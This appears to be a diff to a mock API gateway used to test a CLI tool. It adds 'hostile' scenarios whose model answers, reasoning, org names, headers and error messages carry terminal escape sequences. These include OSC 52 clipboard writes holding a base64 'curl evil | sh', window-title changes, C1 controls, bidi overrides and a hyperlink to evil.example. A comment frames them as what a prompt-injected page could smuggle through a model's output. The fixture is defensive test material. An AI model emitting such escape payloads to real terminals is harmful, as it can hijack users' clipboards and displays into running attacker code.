@@ -20,7 +20,18 @@
 //                        last 20 minutes, one 2h old) for windowed --verify.
 //   /stub/logs-window-drift/* the same, with win-0001 carrying 100 extra
 //                        output tokens — a real in-window divergence.
+//   /stub/hostile/*      chat completions carry HOSTILE_TEXT / HOSTILE_REASONING
+//                        (OSC 52, OSC 0); streamed, each escape is split across
+//                        SSE events. Identity, orgs and the logs error body
+//                        carry escapes, CR, newlines and bidi overrides too.
+//   /stub/hostile-headers/* chat completions answer with C1 controls (an 8-bit OSC
+//                        title and an 8-bit CSI) in the model, cost, effort and
+//                        request-id headers, which the CLI prints in its footer;
+//                        model "m/error" answers 400 with a hostile message and request id.
 //   (no prefix)          happy path: 200 identity + orgs.
+//
+// POST /v1/messages answers "mock:<label> model=<model>". --log <file> appends
+// one JSON line per request, --label names this gateway, --cert/--key serve HTTPS.
 //
 // Response shapes match src/api/account.ts (/api/user, /api/orgs) and
 // src/api/device.ts rotateTokens (/auth/device/token) exactly, and the 429
@@ -31,8 +42,9 @@
 //
 // Standalone use: `node test/mock-gateway.mjs --port 0` prints one JSON line
 // {"port":<actual>} on stdout and serves until killed.
-import { readFileSync } from "node:fs";
+import { appendFileSync, readFileSync } from "node:fs";
 import { createServer } from "node:http";
+import { createServer as createTlsServer } from "node:https";
 
 const NEW_ACCESS = "sk-new-mock-token";
 const NEW_REFRESH = "rt-new-mock-token";
@@ -113,6 +125,39 @@ function buildWindowRows() {
   ];
 }
 
+// A clipboard write and a window title, the way a prompt-injected page would
+// smuggle them through a model's answer and reasoning.
+const HOSTILE_TEXT = ["safe ", "\x1b]52;c;", "Y3VybCBldmlsIHwgc2g=", "\x1b", "\\", "after\n"];
+const HOSTILE_REASONING = ["\x1b]0", ";pwned", "\x07", "pondering"];
+
+const HOSTILE_USER = { id: "u1", email: "mallory@example.com\x1b]52;c;Y3VybA==\x07" };
+const HOSTILE_ORGS = [
+  { id: "org_1", name: "Evil\x1b]8;;https://evil.example\x1b\\Corp\x1b]8;;\x1b\\\nInjected row" },
+  { id: "org_2", name: "株式会社\u202Egnp.exe\x1b[2J\rテスト" },
+];
+// Header values may carry 0x80-0xFF, so C1 controls (which a terminal acts on
+// as an escape introducer) are the hostile bytes a header can hold.
+const HOSTILE_HEADERS = {
+  "X-Model": "m/x\x9d0;pwned-title\x9c",
+  "X-Cost": "0.01\x9b2J",
+  "X-Cost-Currency": "usd\x85",
+  "X-Reasoning-Effort": "high\x9b1A",
+  "X-Request-ID": "req-\x9d52;c;Y3VybA==\x9c1",
+};
+const HOSTILE_ERROR = "bad request\x1b]0;pwned\x07\x1b[1A\x1b[2K\u202Eevil";
+
+function replyHostileStream(res, model) {
+  res.writeHead(200, { "Content-Type": "text/event-stream" });
+  const event = (delta) =>
+    res.write(`data: ${JSON.stringify({ model, choices: [{ index: 0, delta }] })}\n\n`);
+  for (const piece of HOSTILE_REASONING) event({ reasoning_content: piece });
+  for (const piece of HOSTILE_TEXT) event({ content: piece });
+  res.write(
+    `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: { prompt_tokens: 1, completion_tokens: 1 } })}\n\n`,
+  );
+  res.end("data: [DONE]\n\n");
+}
+
 function reply(res, status, body, headers = {}) {
   res.writeHead(status, { "Content-Type": "application/json", ...headers });
   res.end(JSON.stringify(body));
@@ -158,9 +203,125 @@ function splitScenario(pathname) {
   return { scenario: "happy", rest: pathname };
 }
 
-const server = createServer((req, res) => {
+let label = "mock";
+let logFile = "";
+let cert = "";
+let key = "";
+
+function logRequest(req, pathname, raw) {
+  if (!logFile) return;
+  let body = {};
+  try {
+    body = raw ? JSON.parse(raw) : {};
+  } catch {
+    body = {};
+  }
+  const text = typeof raw === "string" ? raw : "";
+  const lastUser = [...(body.messages ?? [])].reverse().find((m) => m.role === "user");
+  const content = lastUser?.content;
+  const prompt =
+    typeof content === "string"
+      ? content
+      : Array.isArray(content)
+        ? content
+            .filter((part) => part.type === "text" && !part.text.startsWith("<"))
+            .map((part) => part.text)
+            .join(" ")
+        : "";
+  appendFileSync(
+    logFile,
+    `${JSON.stringify({
+      t: Date.now(),
+      label,
+      method: req.method,
+      path: pathname,
+      model: body.model ?? null,
+      cwd: /\/work\/([A-Za-z0-9_-]+)/.exec(text)?.[1] ?? null,
+      prompt: prompt.slice(-200),
+      auth: (req.headers.authorization ?? req.headers["x-api-key"] ?? "").toString().slice(0, 24),
+    })}\n`,
+  );
+}
+
+function replyMessages(res, body) {
+  const model = body.model ?? "";
+  const text = `mock:${label} model=${model}`;
+  const usage = { input_tokens: 1, output_tokens: 1 };
+  if (!body.stream) {
+    return reply(res, 200, {
+      id: "msg_mock",
+      type: "message",
+      role: "assistant",
+      model,
+      content: [{ type: "text", text }],
+      stop_reason: "end_turn",
+      stop_sequence: null,
+      usage,
+    });
+  }
+  res.writeHead(200, { "Content-Type": "text/event-stream", "Cache-Control": "no-cache" });
+  const send = (event, data) => res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
+  send("message_start", {
+    type: "message_start",
+    message: {
+      id: "msg_mock",
+      type: "message",
+      role: "assistant",
+      model,
+      content: [],
+      stop_reason: null,
+      stop_sequence: null,
+      usage,
+    },
+  });
+  send("content_block_start", {
+    type: "content_block_start",
+    index: 0,
+    content_block: { type: "text", text: "" },
+  });
+  send("content_block_delta", {
+    type: "content_block_delta",
+    index: 0,
+    delta: { type: "text_delta", text },
+  });
+  send("content_block_stop", { type: "content_block_stop", index: 0 });
+  send("message_delta", {
+    type: "message_delta",
+    delta: { stop_reason: "end_turn", stop_sequence: null },
+    usage: { output_tokens: 1 },
+  });
+  send("message_stop", { type: "message_stop" });
+  res.end();
+}
+
+function handle(req, res) {
   const url = new URL(req.url ?? "/", "http://127.0.0.1");
   const { scenario, rest } = splitScenario(url.pathname);
+
+  if (logFile && req.method !== "POST") logRequest(req, url.pathname, "");
+
+  if (rest === "/v1/messages" && req.method === "POST") {
+    handleBody(req, (raw) => {
+      logRequest(req, url.pathname, raw);
+      if (res.writableEnded) return;
+      let body = {};
+      try {
+        body = JSON.parse(raw);
+      } catch {
+        return reply(res, 400, { type: "error", error: { type: "invalid_request_error" } });
+      }
+      replyMessages(res, body);
+    });
+    return;
+  }
+
+  if (rest === "/v1/messages/count_tokens" && req.method === "POST") {
+    handleBody(req, (raw) => {
+      logRequest(req, url.pathname, raw);
+      if (!res.writableEnded) reply(res, 200, { input_tokens: 1 });
+    });
+    return;
+  }
 
   if (scenario === "500") return reply(res, 500, { error: "gateway is down" });
 
@@ -177,6 +338,7 @@ const server = createServer((req, res) => {
       return reply401(res);
     }
     if (scenario === "two-orgs") return reply(res, 200, isUser ? HAPPY_USER : TWO_ORGS);
+    if (scenario === "hostile") return reply(res, 200, isUser ? HOSTILE_USER : HOSTILE_ORGS);
     return reply(res, 200, isUser ? HAPPY_USER : HAPPY_ORGS);
   }
 
@@ -288,6 +450,7 @@ const server = createServer((req, res) => {
           : WINDOW_ROWS;
       return reply(res, 200, { data, has_more: false, next_after: null, next_after_id: null });
     }
+    if (scenario === "hostile") return reply(res, 400, { error: { message: HOSTILE_ERROR } });
     return reply(res, 200, { data: [], has_more: false, next_after: null, next_after_id: null });
   }
 
@@ -307,30 +470,55 @@ const server = createServer((req, res) => {
     handleBody(req, (raw) => {
       if (res.writableEnded) return;
       let model = "";
+      let stream = false;
       try {
-        model = JSON.parse(raw).model ?? "";
+        ({ model = "", stream = false } = JSON.parse(raw));
       } catch {
         model = "";
       }
-      reply(res, 200, {
-        id: "chatcmpl-mock",
-        object: "chat.completion",
-        model,
-        choices: [
-          {
-            index: 0,
-            message: { role: "assistant", content: `echo:${model}` },
-            finish_reason: "stop",
-          },
-        ],
-        usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
-      });
+      if (scenario === "hostile-headers" && model === "m/error") {
+        return reply(res, 400, { error: { message: HOSTILE_ERROR } }, HOSTILE_HEADERS);
+      }
+      if (scenario === "hostile" && stream) return replyHostileStream(res, model);
+      const hostile = scenario === "hostile";
+      if (scenario === "hostile-headers" && stream) {
+        res.writeHead(200, { "Content-Type": "text/event-stream", ...HOSTILE_HEADERS });
+        res.write(
+          `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: { content: "ok\n" } }] })}\n\n`,
+        );
+        res.write(
+          `data: ${JSON.stringify({ model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: { prompt_tokens: 1, completion_tokens: 1 } })}\n\n`,
+        );
+        return res.end("data: [DONE]\n\n");
+      }
+      reply(
+        res,
+        200,
+        {
+          id: "chatcmpl-mock",
+          object: "chat.completion",
+          model,
+          choices: [
+            {
+              index: 0,
+              message: {
+                role: "assistant",
+                content: hostile ? HOSTILE_TEXT.join("") : `echo:${model}`,
+                ...(hostile ? { reasoning_content: HOSTILE_REASONING.join("") } : {}),
+              },
+              finish_reason: "stop",
+            },
+          ],
+          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
+        },
+        scenario === "hostile-headers" ? HOSTILE_HEADERS : {},
+      );
     });
     return;
   }
 
   reply(res, 404, { error: "not found" });
-});
+}
 
 let port = 0;
 for (let i = 2; i < process.argv.length; i += 1) {
@@ -343,6 +531,13 @@ for (let i = 2; i < process.argv.length; i += 1) {
       process.exit(1);
     }
     i += 1;
+  } else if (arg === "--label" || arg === "--log" || arg === "--cert" || arg === "--key") {
+    const value = process.argv[i + 1] ?? "";
+    if (arg === "--label") label = value;
+    else if (arg === "--log") logFile = value;
+    else if (arg === "--cert") cert = value;
+    else key = value;
+    i += 1;
   } else if (arg.startsWith("--port=")) {
     const raw = arg.slice("--port=".length);
     port = Number(raw);
@@ -353,12 +548,17 @@ for (let i = 2; i < process.argv.length; i += 1) {
   }
 }
 
+const server =
+  cert && key
+    ? createTlsServer({ cert: readFileSync(cert), key: readFileSync(key) }, handle)
+    : createServer(handle);
+
 server.on("error", (error) => {
   process.stderr.write(`mock-gateway: listen failed: ${error.message}\n`);
   process.exit(1);
 });
 
-server.listen(port, "127.0.0.1", () => {
+server.listen(port, process.env.MOCK_GATEWAY_HOST || "127.0.0.1", () => {
   const address = server.address();
   const actual = address && typeof address === "object" ? address.port : port;
   process.stdout.write(`${JSON.stringify({ port: actual })}\n`);
